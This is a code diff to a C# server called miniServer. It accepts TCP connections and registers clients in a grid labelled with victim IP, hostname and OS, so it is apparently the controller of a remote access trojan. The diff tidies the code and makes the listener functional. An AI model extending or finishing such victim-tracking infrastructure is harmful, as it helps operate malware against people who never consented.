@@ -50,7 +50,7 @@ namespace miniServer
 
         private void Form1_FormClosing(object sender, FormClosingEventArgs e)
         {
-            if (MessageBox.Show("Are you sure for Exit?", "Exit",MessageBoxButtons.YesNo) != DialogResult.Yes)
+            if (MessageBox.Show("Are you sure for Exit?", "Exit", MessageBoxButtons.YesNo) != DialogResult.Yes)
             {
                 e.Cancel = true;
             }
@@ -59,10 +59,10 @@ namespace miniServer
         private void ButtonStart_Click(object sender, EventArgs e)
         {
             buttonStart.Enabled = false;
-            writelog("Server Started",null);
+            writelog("Server Started", null);
             buttonStop.Enabled = true;
 
-            serverTcp = new TcpListener(IPAddress.Any, (int)numericUpDownPort.Value );
+            serverTcp = new TcpListener(IPAddress.Any, (int)numericUpDownPort.Value);
             serverTcp.Start();
 
             serverThread = new Thread(() =>
@@ -70,16 +70,15 @@ namespace miniServer
                 while (true)
                 {
                     var tcpClient = serverTcp.AcceptTcpClient();
-            byte[] helloBytes = null;
+                    byte[] helloBytes = null;
 
-            
                     try
                     {
                         NetworkStream stream = tcpClient.GetStream();
                         byte[] bytes = new byte[4096];
                         int byteread = stream.Read(bytes, 0, bytes.Length);
 
-                        //Decrypt recived data
+                        //Decrypt received data
                         helloBytes = new byte[byteread];
                         Array.Copy(bytes, helloBytes, byteread);
 
@@ -87,18 +86,16 @@ namespace miniServer
                         string incomming = Encoding.UTF8.GetString(helloBytes);
 
                         string[] stringSeparators = new string[] { seperator };
-                        string[] recive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
-                        //Recived: clientid;;osVersion;;clientversion;;HostName(optinal)
-                        if (recive.Length > 4)
+                        string[] receive = incomming.Split(stringSeparators, StringSplitOptions.RemoveEmptyEntries);
+                        //Recived: clientid|||osVersion|||clientversion|||HostName(optinal)
+                        if (receive.Length == 4)
                         {
-                            int id = int.Parse(recive[0]);
+                            int id = int.Parse(receive[0]);
 
-                            string hostName = "";
-                            if (recive.Length == 4)
-                                hostName = recive[3];
+                            string hostName = receive[3];
 
                             //A new client
-                            addNewClienet(tcpClient, recive[1], recive[2], recive[3], incomming, hostName);
+                            AddNewClienet(tcpClient, receive[1], receive[2], receive[3], incomming, hostName);
                             return;
 
                         }
@@ -116,13 +113,17 @@ namespace miniServer
                     }
                 }
             });
+            serverThread.IsBackground = true;
+            serverThread.Start();
         }
-        void addNewClienet(TcpClient tcpClient, string os, string version, string keyClient, string incomming, string hostName)
+
+
+        void AddNewClienet(TcpClient tcpClient, string os, string version, string keyClient, string incomming, string hostName)
         {
             miniClient mc = new miniClient(1, tcpClient, os, version, hostName);
 
             //Hello is for future use
-            mc.SendToClient(mc.ID.ToString() + ";;" + "Hello");
+            mc.SendToClient(mc.ID.ToString() + "|||" + "Hello");
 
             //ADD new client to datagridview
             DataGridViewRow row = new DataGridViewRow();
@@ -130,14 +131,18 @@ namespace miniServer
             //TODO:IP country Flag
             //row.Cells[0].Value = getFlagOfIP(sc.IP);//IP country Flag
             row.Cells[1].Value = mc.ID;//ID
-            //Note is emty
+                                       //Note is emty
             row.Cells[3].Value = mc.IP;//Victim IP and Port
             row.Cells[4].Value = mc.HostName;//Victim HostName
             row.Cells[5].Value = mc.OS;//Victim OS version
             row.Cells[6].Value = mc.Version;//Client Version
             row.Cells[7].Value = "Yes";//isAlive
+            dataGridViewClients.Invoke((MethodInvoker)delegate
+            {
+                dataGridViewClients.Rows.Add(row);
+            });
 
-            writelog(mc.IP + " -> Connected :)", mc.IP + " -> Connected :) :\n" + incomming);         
+            writelog(mc.IP + " -> Connected :)", mc.IP + " -> Connected :) :\n" + incomming);
         }
 
         void writelog(string log, string extradata)
@@ -162,8 +167,8 @@ namespace miniServer
             buttonStop.Enabled = false;
             serverThread.Abort();
             serverTcp.Stop();
-         
-            writelog("Server Stopped.",null);
+
+            writelog("Server Stopped.", null);
         }
     }
 }
